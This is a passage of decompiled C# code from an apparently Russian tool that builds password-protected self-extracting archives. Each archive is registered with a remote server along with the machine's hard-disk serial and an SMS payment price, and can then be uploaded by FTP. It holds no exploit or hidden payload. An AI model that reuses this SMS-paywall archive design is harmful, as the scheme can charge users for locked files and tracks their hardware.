        WebClient webClient = new WebClient();
        webClient.DownloadFile(this.FCashObj.DomainIP.Replace("/_arch_api", "") + "/Styles/" + userState.ArchiveStyleName + ".zip", userState.TmpStyle);
        do
          ;
        while (webClient.IsBusy);
        webClient.Dispose();
      }
      catch
      {
        userState.ErrorN = true;
        int num = (int) MessageBox.Show("Ошибка:[1526] Произошла ошибка при создании архива" + strArray[strArray.Length - 1] + " !", "Ошибка архивации", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        backgroundWorker.CancelAsync();
        return;
      }
      new ResourceChanger().AddZIP(userState.TmpName, userState.TmpStyle);
      System.IO.File.Delete(userState.TmpStyle);
      if (System.IO.File.Exists(userState.MyIconPath))
        new ResourceChanger().ChangeIcon(userState.TmpName, userState.MyIconPath);
      if (System.IO.File.Exists(userState.MyPicturePath))
        new ResourceChanger().AddImg(userState.TmpName, userState.MyPicturePath);
      if (userState.ArchivationType == 0)
      {
        string input = this.FCashObj.SendPost(this.FCashObj.DomainIP + "/add_archive.php", "sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial + "&cost=" + (userState.SMS_Price + 1).ToString() + "&altpayment=" + userState.UseAltPay.ToString() + "&altpaycost=" + userState.AltPayCost.ToString() + "&name=" + strArray[strArray.Length - 1].Replace(".exe", "") + "&lang=" + userState.ArchiveLanguage.ToString() + "&paytype=" + userState.PayType.ToString() + "&showprice=" + userState.ShowPrice.ToString() + "&calcopen=" + userState.CalculateOpenCount.ToString());
        if (input == null)
        {
          userState.ErrorN = true;
          int num = (int) MessageBox.Show("Ошибка:[1525] Произошла ошибка при создании архива " + strArray[strArray.Length - 1] + " !", "Ошибка архивации", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          backgroundWorker.CancelAsync();
          return;
        }
        userState.ArchiveID = new Regex("arhive=\"([0-9]*)\",").Match(input).Groups[1].ToString();
        userState.ArchivePassword = new Regex("password=\"(.*)\",").Match(input).Groups[1].ToString();
        userState.Antispam = new Regex("asv=\"(.*)\"").Match(input).Groups[1].ToString();
      }
      string input1 = this.FCashObj.SendPost(this.FCashObj.DomainIP + "/prefix.php", "sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial + "&arhive=" + userState.ArchiveID + "&cost=" + (userState.SMS_Price + 1).ToString() + "&lang=" + userState.ArchiveLanguage.ToString());
      if (input1.Trim() == "" || input1 == "")
      {
        if (userState.ArchivationType == 0 && userState.ArchiveID != null)
          this.DeleteAchive(userState.ArchiveID);
        userState.ErrorN = true;
        int num = (int) MessageBox.Show("Ошибка:[1524] Произошла ошибка при создании архива" + strArray[strArray.Length - 1] + " !", "Ошибка архивации", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        backgroundWorker.CancelAsync();
      }
      else
      {
        userState.ArchiveXML = input1;
        if (userState.ArchivationType == 1)
        {
          string str2 = new Regex("version=\"(.*)\"\\>").Match(input1).Groups[1].ToString();
          userState.ArchiveXML = userState.ArchiveXML.Replace("version=\"" + str2 + "\">", "version=\"" + strArray[strArray.Length - 1].Replace(".exe", "") + "\">");
        }
        try
        {
          StreamWriter streamWriter = new StreamWriter(userState.TmpName, true, Encoding.Default);
          streamWriter.Write(this.FCashObj.Boundary.ToString());
          streamWriter.Flush();
          streamWriter.Write(userState.ArchiveXML);
          streamWriter.Flush();
          streamWriter.Write(userState.ArchiveLanguage.ToString() + userState.PayType.ToString() + userState.ShowPrice.ToString() + userState.UseAltPay.ToString() + userState.CalculateOpenCount.ToString() + userState.Antispam.ToString() + "0\r\n");
          streamWriter.Flush();
          streamWriter.Close();
        }
        catch
        {
          if (userState.ArchivationType == 0 && userState.ArchiveID != null)
            this.DeleteAchive(userState.ArchiveID);
          userState.ErrorN = true;
          int num = (int) MessageBox.Show("Ошибка:[1523] Произошла ошибка при создании архива" + strArray[strArray.Length - 1] + " !", "Ошибка архивации", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          backgroundWorker.CancelAsync();
          return;
        }
        if (userState.ArchivationType == 1)
        {
          try
          {
            FileStream fileStream = new FileStream(userState.ArchiveList[0], FileMode.Open, FileAccess.Read);
            ComponentAce.Compression.ZipForge.ZipForge zipForge = new ComponentAce.Compression.ZipForge.ZipForge();
            this.OLDArchiveObjHashCode[((object) zipForge).GetHashCode().ToString()] = (object) userState;
            ((ArchiverForgeBase) zipForge).OpenArchive((Stream) fileStream, false);
            ArchiveItem archiveItem = new ArchiveItem();
            ((BaseArchiver) zipForge).FindFirst("*", ref archiveItem);
            ((BaseArchiver) zipForge).Password = userState.ArchivePassword;
            if (((BaseArchiver) zipForge).IsFilePasswordValid(((BaseArchiveItem) archiveItem).FileName, userState.ArchivePassword))
            {
              userState.OldArchiveFileCount = Convert.ToInt32(((ArchiverForgeBase) zipForge).FileCount);
              userState.ArchiveList = new string[1];
              userState.ArchiveList[0] = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + str1;
              Directory.CreateDirectory(userState.ArchiveList[0]);
              userState.WorkerStep = "unpack";
              backgroundWorker.ReportProgress(-4, (object) userState);
              // ISSUE: method pointer
              ((ArchiverForgeBase) zipForge).OnFileProgress += new ArchiverForgeBase.OnFileProgressDelegate((object) this, __methodptr(unpak_progress));
              ((ArchiverForgeBase) zipForge).BaseDir = userState.ArchiveList[0];
              ((ArchiverForgeBase) zipForge).ExtractFiles("*.*");
              ((ArchiverForgeBase) zipForge).CloseArchive();
            }
            fileStream.Close();
          }
          catch
          {
            userState.ErrorN = true;
            int num = (int) MessageBox.Show("Ошибка:[1522] Произошла ошибка при обновления архива" + strArray[strArray.Length - 1] + " !", "Ошибка архивации", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            backgroundWorker.CancelAsync();
          }
        }
        backgroundWorker.ReportProgress(-2, (object) userState);
        ComponentAce.Compression.ZipForge.ZipForge zipForge1 = new ComponentAce.Compression.ZipForge.ZipForge();
        this.ArchiveObjHashCode[((object) zipForge1).GetHashCode().ToString()] = (object) userState;
        try
        {
          userState.WorkerStep = "";
          ((ArchiverForgeBase) zipForge1).FileName = userState.ArchiveName;
          ((BaseArchiver) zipForge1).SFXStub = userState.TmpName;
          ((BaseArchiver) zipForge1).Password = userState.ArchivePassword;
          // ISSUE: method pointer
          ((ArchiverForgeBase) zipForge1).OnFileProgress += new ArchiverForgeBase.OnFileProgressDelegate((object) this, __methodptr(archiver_OnFileProgress));
          ((ArchiverForgeBase) zipForge1).OpenArchive(FileMode.Create);
          for (int index = 0; index < userState.ArchiveList.Length; ++index)
          {
            if (System.IO.File.Exists(userState.ArchiveList[index]))
            {
              FileInfo fileInfo = new FileInfo(userState.ArchiveList[index]);
              ((ArchiverForgeBase) zipForge1).BaseDir = fileInfo.DirectoryName;
              ((ArchiverForgeBase) zipForge1).AddFiles(userState.ArchiveList[index]);
            }
            else if (Directory.Exists(userState.ArchiveList[index]))
            {
              DirectoryInfo directoryInfo = new DirectoryInfo(userState.ArchiveList[index]);
              if (userState.ArchivationType == 0)
              {
                ((ArchiverForgeBase) zipForge1).BaseDir = directoryInfo.Parent.FullName;
                ((ArchiverForgeBase) zipForge1).AddFiles(userState.ArchiveList[index]);
              }
              else
              {
                ((ArchiverForgeBase) zipForge1).BaseDir = userState.ArchiveList[index] + "\\";
                ((ArchiverForgeBase) zipForge1).AddFiles("*");
              }
            }
          }
          ((ArchiverForgeBase) zipForge1).CloseArchive();
          if (userState.ArchivationType == 1)
            this.FCashObj.SendPost(this.FCashObj.DomainIP + "/archiveupd.php", "sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial + "&cost=" + (userState.SMS_Price + 1).ToString() + "&altpayment=" + userState.UseAltPay.ToString() + "&altpaycost=" + userState.AltPayCost.ToString() + "&name=" + strArray[strArray.Length - 1].Replace(".exe", "") + "&aid=" + userState.ArchiveID);
          if (userState.FtpConn >= 0)
          {
            XmlDocument xmlDocument1;
            XmlDocument xmlDocument2 = xmlDocument1 = new XmlDocument();
            xmlDocument2.Load(this.FCashObj.FTP_XML_Path);
            XmlNodeList elementsByTagName = xmlDocument2.GetElementsByTagName("acc");
            string innerText1 = elementsByTagName[userState.FtpConn].ChildNodes[0].InnerText;
            string str3 = elementsByTagName[userState.FtpConn].ChildNodes[1].InnerText.Replace("ftp://", "");
            string innerText2 = elementsByTagName[userState.FtpConn].ChildNodes[2].InnerText;
            string innerText3 = elementsByTagName[userState.FtpConn].ChildNodes[3].InnerText;
            string innerText4 = elementsByTagName[userState.FtpConn].ChildNodes[4].InnerText;
            string str4 = Regex.Replace(Regex.Replace(elementsByTagName[userState.FtpConn].ChildNodes[5].InnerText, "^/", ""), "/$", "");
            string str5 = "ftp://" + str3;
            if (innerText2 != "")
              str5 = str5 + ":" + innerText2;
            if (str4 != "")
              str5 = str5 + "/" + str4 + "/";
            if (!str5.EndsWith("/"))
              str5 += "/";
            try
            {
              FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(str5 + strArray[strArray.Length - 1]);
              ftpWebRequest.Method = "STOR";
              ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(innerText3, innerText4);
              ftpWebRequest.UsePassive = true;
              ftpWebRequest.UseBinary = true;
              ftpWebRequest.KeepAlive = false;
              Stream requestStream = ftpWebRequest.GetRequestStream();
              byte[] buffer = new byte[2048];
              int num = 0;
              backgroundWorker.ReportProgress(-3, (object) userState);
              FileStream fileStream = System.IO.File.OpenRead(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "/" + strArray[strArray.Length - 1]);
              int count;
              do
              {
                count = fileStream.Read(buffer, 0, 2048);
                requestStream.Write(buffer, 0, count);
                num += count;
                userState.WorkerStep = "ftp";
                backgroundWorker.ReportProgress(Convert.ToInt32((long) (num * 100) / fileStream.Length), (object) userState);
              }
              while (count != 0);
              requestStream.Close();
              fileStream.Close();
            }
            catch
            {
              int num = (int) MessageBox.Show("Не возможно подлючится по FTP!", "Ошибка подключения", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
          }
        }
        catch
        {
          if (userState.ArchivationType == 0 && userState.ArchiveID != null && userState.WorkerStep != "ftp")
            this.DeleteAchive(userState.ArchiveID);
          userState.ErrorN = true;
          int num = (int) MessageBox.Show("Ошибка:[1521] Произошла ошибка при создании архива" + strArray[strArray.Length - 1] + " !", "Ошибка архивации", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          backgroundWorker.CancelAsync();
        }
        backgroundWorker.Dispose();
      }
    }

    public void DeleteAchive(string aid)
    {
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(this.FCashObj.DomainIP + "/del_archive.php");
      httpWebRequest.Method = "POST";
      httpWebRequest.ContentType = "application/x-www-form-urlencoded";
      byte[] bytes = Encoding.UTF8.GetBytes("sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial + "&aid=" + aid);
      httpWebRequest.ContentLength = (long) bytes.Length;
      Stream requestStream = httpWebRequest.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      WebResponse response = httpWebRequest.GetResponse();
      StreamReader streamReader = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
      streamReader.ReadToEnd();
      streamReader.Close();
      response.Close();
    }

    private void backgroundWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
    {
      PreparingArchivationParams userState = e.UserState as PreparingArchivationParams;
      ProgressBar pbar = userState.PBar as ProgressBar;
      if (e.ProgressPercentage == -1)
      {
        pbar.Style = ProgressBarStyle.Marquee;
        string[] strArray = userState.ArchiveName.Split('\\');
        ListViewItem listViewItem = new ListViewItem(strArray[strArray.Length - 1]);
        listViewItem.SubItems.Add("");
        listViewItem.SubItems.Add("Работает");
        this.TaskList.Items.Add(listViewItem);
        this.TaskList.AddEmbeddedControl((Control) pbar, 1, listViewItem.Index);
        userState.TaskListItem = listViewItem;
      }
      else if (e.ProgressPercentage == -2)
      {
        pbar.Style = ProgressBarStyle.Blocks;
        int num = 0;
        for (int index = 0; index < userState.ArchiveList.Length; ++index)
          num += this.GetFileCount(userState.ArchiveList[index]);
        pbar.Maximum = 0;
        pbar.Value = 0;
        pbar.Maximum = num * 10;
      }
      else if (e.ProgressPercentage == -3)
      {
        pbar.Style = ProgressBarStyle.Blocks;
        pbar.Maximum = 100;
        pbar.Value = 0;
        pbar.Minimum = 0;
      }
      else if (e.ProgressPercentage == -4)
      {
        pbar.Style = ProgressBarStyle.Blocks;
        pbar.Maximum = userState.OldArchiveFileCount;
        pbar.Value = 0;
        pbar.Step = 1;
        pbar.Minimum = 0;
      }
      else if (userState.WorkerStep == "ftp")
        pbar.Value = e.ProgressPercentage;
      else if (userState.WorkerStep == "unpack")
      {
        pbar.PerformStep();
      }
      else
      {
        if ((int) Math.Floor((double) pbar.Value / 10.0) * 10 + 10 * e.ProgressPercentage / 100 > pbar.Maximum)
          return;
        pbar.Value = (int) Math.Floor((double) pbar.Value / 10.0) * 10 + 10 * e.ProgressPercentage / 100;
      }
    }

    private void backgroundWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      PreparingArchivationParams archivationParams = this.WorkerObjHashCode[sender.GetHashCode().ToString()] as PreparingArchivationParams;
      this.TaskList.Items.Remove(archivationParams.TaskListItem);
      string[] strArray = archivationParams.ArchiveName.Split('\\');
      if (e.Error != null)
      {
        if (System.IO.File.Exists(archivationParams.TmpName))
          System.IO.File.Delete(archivationParams.TmpName);
        int num = (int) MessageBox.Show("Ошибка:[1520] Произошла ошибка при создании архива " + strArray[strArray.Length - 1] + " !", "Ошибка архивации", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else
      {
        if (archivationParams.ErrorN)
          return;
        System.IO.File.Delete(archivationParams.TmpName);
        int num = (int) MessageBox.Show("Архив " + strArray[strArray.Length - 1] + " создан");
      }
    }

    private void archiver_OnFileProgress(
      object sender,
      string fileName,
      double progress,
      TimeSpan timeElapsed,
      TimeSpan timeLeft,
      ProcessOperation operation,
      ProgressPhase progressPhase,
      ref bool cancel)
    {
      if (fileName.EndsWith("\\"))
        return;
      ((this.ArchiveObjHashCode[sender.GetHashCode().ToString()] as PreparingArchivationParams).Worker as BackgroundWorker).ReportProgress((int) progress, (object) (this.ArchiveObjHashCode[sender.GetHashCode().ToString()] as PreparingArchivationParams));
    }

    private void unpak_progress(
      object sender,
      string fileName,
      double progress,
      TimeSpan timeElapsed,
      TimeSpan timeLeft,
      ProcessOperation operation,
      ProgressPhase progressPhase,
      ref bool cancel)
    {
      ((this.OLDArchiveObjHashCode[sender.GetHashCode().ToString()] as PreparingArchivationParams).Worker as BackgroundWorker).ReportProgress((int) progress, (object) (this.OLDArchiveObjHashCode[sender.GetHashCode().ToString()] as PreparingArchivationParams));
    }

    private void UseMyIcon_CheckedChanged(object sender, EventArgs e)
    {
      if (this.UseMyIcon.Checked && this.UseIcon == null)
      {
        if (this.ICO_OpenDialog.ShowDialog() != DialogResult.Cancel)
          return;
        this.UseIcon = (string) null;
        this.UseMyIcon.Checked = false;
      }
      else
      {
        if (this.UseMyIcon.Checked)
          return;
        this.UseIcon = (string) null;
      }
    }

    private void ICO_OpenDialog_FileOk(object sender, CancelEventArgs e) => this.UseIcon = this.ICO_OpenDialog.FileName;

    private void AllowAltPayment_CheckedChanged(object sender, EventArgs e)
    {
      if (this.AllowAltPayment.Checked)
        this.IndicateAltPaymentSum.Enabled = true;
      else
        this.IndicateAltPaymentSum.Enabled = false;
    }

    private void IndicateAltPaymentSum_KeyPress(object sender, KeyPressEventArgs e) => e.Handled = !char.IsDigit(e.KeyChar) && e.KeyChar != '\b';

    private void AddFTP_Click(object sender, EventArgs e)
    {
      if (new FTP(ref this.FCashObj).ShowDialog() != DialogResult.Cancel)
        return;
      this.showftp();
    }

    private void Menu_FTP_cont_VisibleChanged(object sender, EventArgs e)
    {
      if (!((Control) sender).Visible)
        return;
      this.showftp();
    }

    private void showftp()
    {
      if (!System.IO.File.Exists(this.FCashObj.FTP_XML_Path))
        return;
      XmlDocument xmlDocument1;
      XmlDocument xmlDocument2 = xmlDocument1 = new XmlDocument();
      xmlDocument2.Load(this.FCashObj.FTP_XML_Path);
      XmlNodeList elementsByTagName = xmlDocument2.GetElementsByTagName("acc");
      this.SelectFtpConection.Items.Clear();
      this.FtpList.Items.Clear();
      for (int index = 0; index < elementsByTagName.Count; ++index)
      {
        this.FtpList.Items.Add(new ListViewItem(elementsByTagName.Item(index).ChildNodes[0].InnerText)
        {
          SubItems = {
            elementsByTagName.Item(index).ChildNodes[1].InnerText,
            elementsByTagName.Item(index).ChildNodes[2].InnerText,
            elementsByTagName.Item(index).ChildNodes[5].InnerText,
            elementsByTagName.Item(index).ChildNodes[3].InnerText,
            elementsByTagName.Item(index).ChildNodes[4].InnerText
          }
        });
        this.SelectFtpConection.Items.Add((object) elementsByTagName.Item(index).ChildNodes[0].InnerText);
      }
    }

    private void showprofiles()
    {
      if (!System.IO.File.Exists(this.FCashObj.SavedProfilePath))
        return;
      XmlDocument xmlDocument1;
      XmlDocument xmlDocument2 = xmlDocument1 = new XmlDocument();
      xmlDocument2.Load(this.FCashObj.SavedProfilePath);
      XmlNodeList elementsByTagName = xmlDocument2.GetElementsByTagName("profile");
      this.SavedProfiles.Items.Clear();
      for (int index = 0; index < elementsByTagName.Count; ++index)
        this.SavedProfiles.Items.Add((object) elementsByTagName.Item(index).ChildNodes[0].InnerText);
    }

    private void DeleteFTP_Click(object sender, EventArgs e)
    {
      if (this.FtpList.SelectedItems.Count == 0 || !System.IO.File.Exists(this.FCashObj.FTP_XML_Path))
        return;
      XmlDocument xmlDocument1;
      XmlDocument xmlDocument2 = xmlDocument1 = new XmlDocument();
      xmlDocument2.Load(this.FCashObj.FTP_XML_Path);
      XmlNodeList elementsByTagName = xmlDocument2.GetElementsByTagName("acc");
      foreach (ListViewItem selectedItem in this.FtpList.SelectedItems)
        elementsByTagName[selectedItem.Index].ParentNode.RemoveChild(elementsByTagName[selectedItem.Index]);
      FileStream outStream = new FileStream(this.FCashObj.FTP_XML_Path, FileMode.Truncate, FileAccess.Write, FileShare.ReadWrite);
      xmlDocument2.Save((Stream) outStream);
      outStream.Close();
      this.showftp();
    }

    private void SavedProfiles_SelectedIndexChanged(object sender, EventArgs e)
    {
      if (this.SavedProfiles.Text.Trim() == "")
        return;
      XmlDocument xmlDocument1;
      XmlDocument xmlDocument2 = xmlDocument1 = new XmlDocument();
      xmlDocument2.Load(this.FCashObj.SavedProfilePath);
      XmlNodeList elementsByTagName = xmlDocument2.GetElementsByTagName("profile");
      this.SelectPaymentType.SelectedIndex = Convert.ToInt32(elementsByTagName[this.SavedProfiles.SelectedIndex].ChildNodes[1].InnerText);
      this.SelectArchivePrice.SelectedIndex = Convert.ToInt32(elementsByTagName[this.SavedProfiles.SelectedIndex].ChildNodes[2].InnerText);
      if (elementsByTagName[this.SavedProfiles.SelectedIndex].ChildNodes[3].InnerText.Trim() != "0")
      {
        this.AllowAltPayment.Checked = true;
        this.IndicateAltPaymentSum.Text = elementsByTagName[this.SavedProfiles.SelectedIndex].ChildNodes[3].InnerText;
        this.IndicateAltPaymentSum.Enabled = true;
      }
      else
      {
        this.AllowAltPayment.Checked = false;
        this.IndicateAltPaymentSum.Text = (string) null;
        this.IndicateAltPaymentSum.Enabled = false;
      }
      this.SelectArchiveStyle.SelectedIndex = Convert.ToInt32(elementsByTagName[this.SavedProfiles.SelectedIndex].ChildNodes[4].InnerText);
      this.SelectArchiveLangage.SelectedIndex = Convert.ToInt32(elementsByTagName[this.SavedProfiles.SelectedIndex].ChildNodes[5].InnerText);
      this.UseOpenCount.Checked = Convert.ToInt32(elementsByTagName[this.SavedProfiles.SelectedIndex].ChildNodes[6].InnerText) == 1;
      if (Convert.ToInt32(elementsByTagName[this.SavedProfiles.SelectedIndex].ChildNodes[7].InnerText) == 1)
        this.ShowPriseForClient.Checked = true;
      else
        this.ShowPriseForClient.Checked = false;
    }

    private void ArchivationTypeChange(object sender, EventArgs e)
    {
      RadioButton radioButton = sender as RadioButton;
      if (radioButton.Name == "NewArchive" && radioButton.Checked)
      {
        this.ForNewArch.Location = new Point(2, 70);
        this.ForNewArch.Width = 506;
        this.ForNewArch.Height = 135;
        this.ForNewArch.Visible = true;
        this.ForUpdateArchive.Visible = false;
      }
      else
      {
        if (!(radioButton.Name == "UpdateArchive") || !radioButton.Checked)
          return;
        this.ForUpdateArchive.Location = new Point(2, 70);
        this.ForUpdateArchive.Width = 506;
        this.ForUpdateArchive.Height = 135;
        this.ForUpdateArchive.Visible = true;
        this.ForNewArch.Visible = false;
      }
    }

    private void menuItem_Click(object sender, EventArgs e)
    {
      MenuItem menuItem = sender as MenuItem;
      XmlDocument xmlDocument1;
      XmlDocument xmlDocument2 = xmlDocument1 = new XmlDocument();
      xmlDocument2.Load(this.FCashObj.SavedProjectPath);
      XmlNodeList elementsByTagName = xmlDocument2.GetElementsByTagName("project");
      this.Project_Name.Text = "";
      this.SelectPaymentType.SelectedIndex = Convert.ToInt32(elementsByTagName[menuItem.Index].SelectSingleNode("paytype").InnerText);
      this.SelectArchivePrice.SelectedIndex = Convert.ToInt32(elementsByTagName[menuItem.Index].SelectSingleNode("smsprice").InnerText);
      if (elementsByTagName[menuItem.Index].SelectSingleNode("altpaycost").InnerText.Trim() != "")
      {
        this.AllowAltPayment.Checked = true;
        this.IndicateAltPaymentSum.Text = elementsByTagName[menuItem.Index].SelectSingleNode("altpaycost").InnerText.Trim();
        this.IndicateAltPaymentSum.Enabled = true;
      }
      else
      {
        this.AllowAltPayment.Checked = false;
        this.IndicateAltPaymentSum.Text = (string) null;
        this.IndicateAltPaymentSum.Enabled = false;
      }
      this.ProjectSelect = true;
      this.SelectArchiveStyle.SelectedIndex = Convert.ToInt32(elementsByTagName[menuItem.Index].SelectSingleNode("style").InnerText);
      this.ProjectSelect = false;
      this.SelectArchiveLangage.SelectedIndex = Convert.ToInt32(elementsByTagName[menuItem.Index].SelectSingleNode("language").InnerText);
      this.UseOpenCount.Checked = Convert.ToInt32(elementsByTagName[menuItem.Index].SelectSingleNode("open").InnerText) == 1;
      this.ShowPriseForClient.Checked = Convert.ToInt32(elementsByTagName[menuItem.Index].SelectSingleNode("showprice").InnerText) == 1;
      if (elementsByTagName[menuItem.Index].SelectSingleNode("icon").InnerText.Trim() != "")
      {
        this.UseIcon = elementsByTagName[menuItem.Index].SelectSingleNode("icon").InnerText;
        this.UseMyIcon.Checked = true;
      }
      else
        this.UseMyIcon.Checked = false;
      if (elementsByTagName[menuItem.Index].SelectSingleNode("img").InnerText.Trim() != "")
        this.UseImg = elementsByTagName[menuItem.Index].SelectSingleNode("img").InnerText.Trim();
      XmlNodeList xmlNodeList = elementsByTagName[menuItem.Index].SelectNodes("filelist")[0].SelectNodes("file");
      if (elementsByTagName[menuItem.Index].SelectSingleNode("type").InnerText == "0")
      {
        this.ArchivationList.Items.Clear();
        for (int i = 0; i < xmlNodeList.Count; ++i)
        {
          if (System.IO.File.Exists(xmlNodeList[i].InnerText))
          {
            FileInfo fileInfo = new FileInfo(xmlNodeList[i].InnerText);
            this.ArchivationList.Items.Add(new ListViewItem(fileInfo.Name, 1)
            {
              SubItems = {
                fileInfo.Length.ToString(),
                xmlNodeList[i].InnerText
              }
            });
          }
          else if (Directory.Exists(xmlNodeList[i].InnerText))
          {
            string[] strArray = xmlNodeList[i].InnerText.Split('\\');
            this.ArchivationList.Items.Add(new ListViewItem(strArray[strArray.Length - 1], 0)
            {
              SubItems = {
                "-",
                xmlNodeList[i].InnerText
              }
            });
          }
          else
          {
            string[] strArray = xmlNodeList[i].InnerText.Split('\\');
            this.ArchivationList.Items.Add(new ListViewItem(strArray[strArray.Length - 1], 2)
            {
              SubItems = {
                "-",
                xmlNodeList[i].InnerText
              }
            });
          }
        }
      }
      else
      {
        if (!(elementsByTagName[menuItem.Index].SelectSingleNode("type").InnerText == "1"))
          return;
        this.UpdateArchive.Checked = true;
        this.OldFilePath.Text = xmlNodeList[0].InnerText;
        if (this.CheckOldArchiv(xmlNodeList[0].InnerText))
          this.OldArchiveChecked = true;
        else
          this.OldArchiveChecked = false;
      }
    }

    private void OldFileBrouse_Click(object sender, EventArgs e)
    {
      if (this.OldFileBrouseDialog.ShowDialog() != DialogResult.OK)
        return;
      this.OldFilePath.Text = this.OldFileBrouseDialog.FileName;
      this.CheckOldArchiv(this.OldFileBrouseDialog.FileName);
    }

    private bool CheckOldArchiv(string path)
    {
      if (!System.IO.File.Exists(path))
      {
        this.OldFileList.Items.Clear();
        this.OldArchiveChecked = false;
        int num = (int) MessageBox.Show("Не найден архив-источник! ", "Ошибка обновления архива", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        this.OldArchiveID = this.OldArchivePass = this.OldArchiveAntispam = (string) null;
        return false;
      }
      int length = 5242880;
      FileStream fileStream1 = new FileStream(path, FileMode.Open, FileAccess.Read);
      StreamReader streamReader = new StreamReader((Stream) fileStream1, Encoding.Default);
      do
      {
        char[] buffer = new char[length];
        streamReader.Read(buffer, 0, buffer.Length);
        this.OldArchiveID = new Regex("\\<prefixlist id\\=\"([0-9]*)\"", RegexOptions.Singleline).Match(new string(buffer)).Groups[1].ToString();
      }
      while (streamReader.Peek() >= 0 && this.OldArchiveID == null);
      streamReader.Close();
      fileStream1.Dispose();
      fileStream1.Close();
      string s = this.FCashObj.SendPost(this.FCashObj.DomainIP + "/checkmyarch.php", "arch=" + this.OldArchiveID + "&sid=" + this.FCashObj.SID);
      if (s == null)
        return false;
      try
      {
        XmlDocument xmlDocument = new XmlDocument();
        MemoryStream memoryStream;
        MemoryStream inStream = memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(s));
        xmlDocument.Load((Stream) inStream);
        XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("xml");
        if (elementsByTagName[0].ChildNodes.Item(0).InnerText == this.FCashObj.MD5(this.OldArchiveID + "_OK_chackingComplete"))
        {
          this.OldFileList.Items.Clear();
          this.OldArchiveID = elementsByTagName[0].ChildNodes.Item(1).InnerText;
          this.OldArchivePass = elementsByTagName[0].ChildNodes.Item(7).InnerText;
          this.OldArchiveAntispam = elementsByTagName[0].ChildNodes.Item(8).InnerText;
          FileStream fileStream2 = new FileStream(path, FileMode.Open, FileAccess.Read);
          ComponentAce.Compression.ZipForge.ZipForge zipForge = new ComponentAce.Compression.ZipForge.ZipForge();
          ((ArchiverForgeBase) zipForge).OpenArchive((Stream) fileStream2, false);
          ((BaseArchiver) zipForge).Password = this.OldArchivePass;
          ArchiveItem archiveItem = new ArchiveItem();
          string str = (string) null;
          if (((BaseArchiver) zipForge).FindFirst("*", ref archiveItem))
          {
            do
            {
              if (((BaseArchiveItem) archiveItem).FileName != "")
                str = ((BaseArchiveItem) archiveItem).FileName;
            }
            while (((BaseArchiver) zipForge).FindNext(ref archiveItem) && str == null);
            if (str != null)
            {
              if (((BaseArchiver) zipForge).IsFilePasswordValid(str, this.OldArchivePass))
              {
                this.OldFileList.Items.Add(new ListViewItem(elementsByTagName[0].ChildNodes.Item(2).InnerText)
                {
                  SubItems = {
                    elementsByTagName[0].ChildNodes.Item(3).InnerText,
                    elementsByTagName[0].ChildNodes.Item(4).InnerText,
                    elementsByTagName[0].ChildNodes.Item(5).InnerText,
                    elementsByTagName[0].ChildNodes.Item(6).InnerText
                  }
                });
                this.OldArchiveChecked = true;
                fileStream2.Close();
                return true;
              }
              this.OldFileList.Items.Clear();
              this.OldArchiveChecked = false;
              int num = (int) MessageBox.Show("Произошла ошибка обновления архива! ", "Ошибка обновления архива", MessageBoxButtons.OK, MessageBoxIcon.Hand);
              this.OldArchiveID = this.OldArchivePass = this.OldArchiveAntispam = (string) null;
              fileStream2.Close();
              return false;
            }
            this.OldFileList.Items.Clear();
            this.OldArchiveChecked = false;
            int num1 = (int) MessageBox.Show("Произошла ошибка обновления архива! ", "Ошибка обновления архива", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            this.OldArchiveID = this.OldArchivePass = this.OldArchiveAntispam = (string) null;
            fileStream2.Close();
            return false;
          }
          this.OldFileList.Items.Clear();
          this.OldArchiveChecked = false;
          int num2 = (int) MessageBox.Show("Произошла ошибка обновления архива! ", "Ошибка обновления архива", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          this.OldArchiveID = this.OldArchivePass = this.OldArchiveAntispam = (string) null;
          fileStream2.Close();
          return false;
        }
        this.OldFileList.Items.Clear();
        this.OldArchiveChecked = false;
        int num3 = (int) MessageBox.Show("Произошла ошибка обновления архива! ", "Ошибка обновления архива", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        this.OldArchiveID = this.OldArchivePass = this.OldArchiveAntispam = (string) null;
        return false;
      }
      catch
      {
        this.OldFileList.Items.Clear();
        this.OldArchiveChecked = false;
        this.OldArchiveID = this.OldArchivePass = this.OldArchiveAntispam = (string) null;
        int num = (int) MessageBox.Show("Произошла ошибка обновления архива! ", "Ошибка создания проекта", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        return false;
      }
    }

    private void SaveAsProject_Click(object sender, EventArgs e)
    {
      if (this.UpdateArchive.Checked && !this.OldArchiveChecked)
      {
        int num1 = (int) MessageBox.Show("Указан не правильный файл! ", "Ошибка создания проекта", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (this.Project_Name.Text.Trim() == "")
      {
        int num2 = (int) MessageBox.Show("Введите имя проекта! ", "Ошибка создания проекта", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else
      {
        if (System.IO.File.Exists(this.FCashObj.SavedProjectPath))
        {
          XmlDocument xmlDocument = new XmlDocument();
          xmlDocument.Load(this.FCashObj.SavedProjectPath);
